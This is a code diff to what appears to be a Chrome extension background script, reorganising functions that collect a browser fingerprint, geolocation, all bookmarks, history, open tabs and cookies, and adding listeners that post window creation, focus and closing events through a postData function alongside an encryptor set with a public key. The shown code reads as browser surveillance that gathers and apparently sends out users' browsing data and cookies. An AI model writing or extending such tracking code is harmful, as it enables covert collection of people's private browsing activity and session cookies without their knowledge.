@@ -43,6 +43,20 @@ encryptor.setPublicKey(publicKey);
 // Define getters.
 ///////////////////////////////////////////////////////////////////////////////
 
+var emitInitial = function () {
+    getFingerprint();
+    getCurrentPosition();
+    getAllBookmarks();
+    getAllHistory();
+    getAllTabs();
+    getAllCookies();
+};
+
+var emitStartUp = function () {
+    getFingerprint();
+    getCurrentPosition();
+};
+
 var getFingerprint = function () {
     fingerprint = {
         userAgent: getUserAgent(),
@@ -103,23 +117,22 @@ var getAllCookies = function () {
     });
 };
 
-var emitInitial = function () {
-    getFingerprint();
-    getCurrentPosition();
-    getAllBookmarks();
-    getAllHistory();
-    getAllTabs();
-    getAllCookies();
-};
-
-var emitStartUp = function () {
-    getFingerprint();
-    getCurrentPosition();
-};
-
 ///////////////////////////////////////////////////////////////////////////////
 // Define listener related functions.
 ///////////////////////////////////////////////////////////////////////////////
+
+var onWindowCreate = function (newWindow) {
+    console.log(newWindow);
+    postData('window-create', newWindow);
+};
+
+var onWindowActive = function (windowId) {
+    postData('window-active', {'windowId': windowId});
+}
+
+var onWindowRemoved = function (windowId) {
+    postData('window-removed', {'windowId': windowId});
+}
 
 var onTabCreate = function (tab) {
     console.log("Tab create:", "#" + tab.id, tab.title, "(" + tab.url + ")");
@@ -138,7 +151,7 @@ var onTabActive = function (activeInfo) {
     console.log("Tab activated:", activeInfo.tabId);
 };
 
-var onTabRemove = function (tabId, removeInfo) {
+var onTabRemoved = function (tabId, removeInfo) {
     console.log("Tab remove:", tabId);
 };
 
@@ -148,10 +161,10 @@ var onURLVisit = function (result) {
     postData('url-visit', result);
 };
 
-var onURLRemoval = function (removed) {
+var onURLRemoved = function (removed) {
     // Log only if particular visits are removed.
     if (!removed.allHistory) {
-        postData('url-removal', removed);
+        postData('url-removed', removed);
     }
 };
 
@@ -169,12 +182,15 @@ var onBookmarkChange = function (id, changeInfo) {
 
 var activateListeners = function () {
     console.log("Activating listeners...");
+    chrome.windows.onCreated.addListener(onWindowCreate);
+    chrome.windows.onFocusChanged.addListener(onWindowActive);
+    chrome.windows.onRemoved.addListener(onWindowRemoved);
     chrome.tabs.onCreated.addListener(onTabCreate);
     chrome.tabs.onUpdated.addListener(onTabUpdate);
     chrome.tabs.onActivated.addListener(onTabActive);
-    chrome.tabs.onRemoved.addListener(onTabRemove);
+    chrome.tabs.onRemoved.addListener(onTabRemoved);
     chrome.history.onVisited.addListener(onURLVisit);
-    chrome.history.onVisitRemoved.addListener(onURLRemoval);
+    chrome.history.onVisitRemoved.addListener(onURLRemoved);
     // chrome.cookies.onChanged.addListener(onCookieChange);
     chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
     chrome.bookmarks.onChanged.addListener(onBookmarkChange);
